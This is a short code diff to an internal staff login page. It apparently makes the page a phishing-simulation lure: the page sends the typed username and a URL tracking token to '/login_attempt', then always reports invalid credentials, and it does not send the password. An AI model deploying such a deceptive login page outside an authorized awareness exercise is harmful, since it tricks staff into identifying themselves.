@@ -20,7 +20,25 @@
     <p>Internal use only. Authorized staff sign in below.</p>
     <input id="u" placeholder="Username" />
     <input id="p" type="password" placeholder="Password" />
-    <button onclick="alert('Invalid credentials. Please contact IT.')">Sign in</button>
+    <button onclick="submitLogin()">Sign in</button>
   </div>
+  <script>
+    async function submitLogin() {
+        try {
+        await fetch('/login_attempt',{
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                username: document.getElementById('u').value,
+                
+                token_id: new URLSearchParams(window.location.search).get('t')
+            }) 
+        });
+    } catch(e) {
+        console.log("Login attempt failed");
+    }
+    alert("Invalid credentials. Please contact IT");
+    }
+  </script>
 </body>
 </html>
